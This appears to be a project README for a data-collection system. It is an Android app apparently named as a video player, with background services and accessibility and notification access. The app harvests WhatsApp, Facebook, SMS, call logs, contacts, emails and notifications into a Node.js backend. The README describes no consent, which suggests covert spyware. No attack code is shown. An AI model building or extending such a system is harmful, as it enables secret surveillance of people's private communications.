# Mobile Data Collection System

A comprehensive mobile data collection system with a React frontend, Node.js backend, and Android mobile app for collecting and managing various types of user data.

## 🏗️ Project Structure

```
tour/
├── backend/                 # Node.js backend server
│   ├── config/             # Centralized configuration
│   ├── controllers/        # API controllers
│   ├── models/            # MongoDB models
│   ├── routes/            # API routes
│   ├── services/          # Business logic services
│   ├── utils/             # Utility functions
│   └── server.js          # Main server file
├── frontend/              # React frontend application
│   ├── src/
│   │   ├── components/    # Reusable UI components
│   │   ├── config/        # App configuration
│   │   ├── services/      # API services
│   │   ├── utils/         # Utility functions
│   │   └── pages/         # Page components
│   └── public/            # Static assets
├── jumpy/                 # Android mobile app
│   └── app/src/main/
│       ├── java/com/jumpy/videoplayerapp/
│       │   ├── services/  # Background services
│       │   └── utils/     # Utility classes
│       └── res/           # Android resources
└── README.md              # This file
```

## 🚀 Features

### Backend Features
- **Centralized Configuration**: All settings in `config/app.js`
- **Reusable Utilities**: Common functions in `utils/helpers.js`
- **API Endpoints**: RESTful APIs for all data types
- **Authentication**: JWT-based auth with Google Sign-In
- **Data Collection**: WhatsApp, Facebook, SMS, Contacts, Call Logs, Emails
- **Firebase Integration**: Real-time data storage
- **Rate Limiting**: API protection
- **Error Handling**: Comprehensive error management

### Frontend Features
- **Reusable Components**: Button, Card, LoadingSpinner, etc.
- **Centralized API Service**: Single service for all API calls
- **Configuration Management**: Environment-based config
- **Responsive Design**: Mobile-first approach
- **Error Boundaries**: Graceful error handling
- **Loading States**: User feedback during operations

### Mobile App Features
- **Permission Management**: Centralized permission handling
- **Data Collection**: Automated harvesting of various data types
- **Background Services**: Continuous data collection
- **API Integration**: Proper backend communication
- **Settings Management**: User-configurable collection intervals

## 🛠️ Technology Stack

### Backend
- **Node.js** (v20+)
- **Express.js** - Web framework
- **MongoDB** - Database
- **Mongoose** - ODM
- **Firebase Admin** - Real-time database
- **JWT** - Authentication
- **Google APIs** - Gmail integration

### Frontend
- **React** (v18.3.1)
- **React Router** - Navigation
- **React Toastify** - Notifications
- **CSS3** - Styling

### Mobile App
- **Android** (API 21+)
- **Java** - Programming language
- **OkHttp** - HTTP client
- **Firebase** - Real-time database

## 📋 Prerequisites

- Node.js 20+ and npm 8+
- MongoDB database
- Firebase project
- Android Studio (for mobile app)
- Google Cloud Console project

## 🔧 Installation

### Backend Setup

1. **Clone the repository**
   ```bash
   git clone <repository-url>
   cd tour/backend
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Environment Configuration**
   Create `.env` file:
   ```env
   NODE_ENV=development
   PORT=5001
   MONGO_URL=your_mongodb_connection_string
   JWT_SECRET=your_jwt_secret
   FIREBASE_DATABASE_URL=your_firebase_url
   FIREBASE_STORAGE_BUCKET=your_firebase_bucket
   ```

4. **Start the server**
   ```bash
   npm start
   # or for development
   npm run dev
   ```

### Frontend Setup

1. **Navigate to frontend directory**
   ```bash
   cd ../frontend
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Environment Configuration**
   Create `.env` file:
   ```env
   REACT_APP_API_BASE_URL=http://localhost:5001
   REACT_APP_GOOGLE_CLIENT_ID=your_google_client_id
   REACT_APP_GOOGLE_REDIRECT_URI=http://localhost:3000
   ```

4. **Start the development server**
   ```bash
   npm start
   ```

### Mobile App Setup

1. **Open in Android Studio**
   ```bash
   cd ../jumpy
   # Open Android Studio and import the project
   ```

2. **Configure Firebase**
   - Add `google-services.json` to `app/` directory
   - Configure Firebase in the project

3. **Update API Configuration**
   - Update `AppConfig.API_BASE_URL` in the app
   - Configure Google Sign-In

4. **Build and Run**
   - Build the APK or run on device/emulator

## 🔐 Permissions

The mobile app requires the following permissions:

- **READ_CONTACTS** - Contact synchronization
- **READ_PHONE_STATE** - Call detection
- **READ_CALL_LOG** - Call history
- **READ_SMS** - Message reading
- **READ_EXTERNAL_STORAGE** - File access
- **POST_NOTIFICATIONS** - App notifications
- **BIND_NOTIFICATION_LISTENER_SERVICE** - Notification access
- **BIND_ACCESSIBILITY_SERVICE** - Accessibility features

## 📊 Data Collection

The system collects the following data types:

1. **WhatsApp Data**
   - Messages
   - Contacts
   - Business data

2. **Facebook Data**
   - Posts and interactions
   - Profile information

3. **Notifications**
   - All app notifications
   - System notifications

4. **SMS & Call Logs**
   - Text messages
   - Call history

5. **Contacts**
   - Phone contacts
   - Email contacts

6. **Emails**
   - Gmail integration
   - Email content

7. **Device Information**
   - Device specs
   - Installed apps

## 🔄 API Endpoints

### Authentication
- `POST /api/auth/google-signin` - Google Sign-In
- `POST /api/auth/signup` - User registration
- `POST /api/auth/signin` - User login

### Data Collection
- `POST /api/whatsapp/messages` - WhatsApp messages
- `POST /api/whatsapp/contacts` - WhatsApp contacts
- `POST /api/facebook/data` - Facebook data
- `POST /api/notifications` - Notifications
- `POST /api/sms` - SMS data
- `POST /api/contacts` - Contacts
- `POST /api/callLogs` - Call logs
- `POST /api/capture/emails` - Emails

### Settings
- `GET /api/settings` - Get settings
- `PUT /api/settings` - Update settings

### Health & Monitoring
- `GET /api/health` - Health check
- `GET /api/admin/stats` - Admin statistics

## 🎨 Frontend Components

### Reusable Components
- **Button** - Multiple variants (primary, secondary, outline, etc.)
- **Card** - Content containers with different elevations
- **LoadingSpinner** - Loading indicators
- **ErrorBoundary** - Error handling
- **EmptyState** - Empty state displays
- **NetworkStatus** - Connection status

### Configuration
- **App Config** - Centralized configuration management
- **API Service** - HTTP client with retry logic
- **Theme System** - Consistent styling

## 🔧 Mobile App Architecture

### Core Classes
- **PermissionManager** - Centralized permission handling
- **ApiService** - Backend communication
- **SettingsManager** - App settings
- **DataHarvesters** - Data collection services

### Services
- **NotificationListener** - Notification monitoring
- **UnifiedAccessibilityService** - Accessibility features
- **FirebaseSyncService** - Data synchronization

## 🚀 Deployment

### Backend Deployment (Render)
1. Connect GitHub repository
2. Set environment variables
3. Deploy automatically

### Frontend Deployment (Vercel)
1. Connect GitHub repository
2. Configure build settings
3. Set environment variables

### Mobile App
1. Build APK in Android Studio
2. Sign with release key
3. Distribute via Google Play or direct APK

## 🔍 Monitoring & Logging

- **Health Checks** - `/api/health` endpoint
- **Error Logging** - Centralized error handling
- **Performance Monitoring** - Request timing
- **Data Statistics** - Collection metrics

## 🛡️ Security

- **JWT Authentication** - Secure token-based auth
- **Rate Limiting** - API protection
- **Input Validation** - Data sanitization
- **CORS Configuration** - Cross-origin protection
- **Environment Variables** - Secure configuration

## 📝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## 📄 License

This project is licensed under the ISC License.

## 🆘 Support

For support and questions:
- Check the documentation
- Review the code comments
- Create an issue on GitHub

## 🔄 Updates

### Recent Changes
- Centralized configuration management
- Reusable component library
- Improved error handling
- Enhanced permission management
- Upgraded dependencies
- Cleaned up project structure

### Future Enhancements
- Real-time data synchronization
- Advanced analytics dashboard
- Machine learning insights
- Enhanced security features
- Performance optimizations 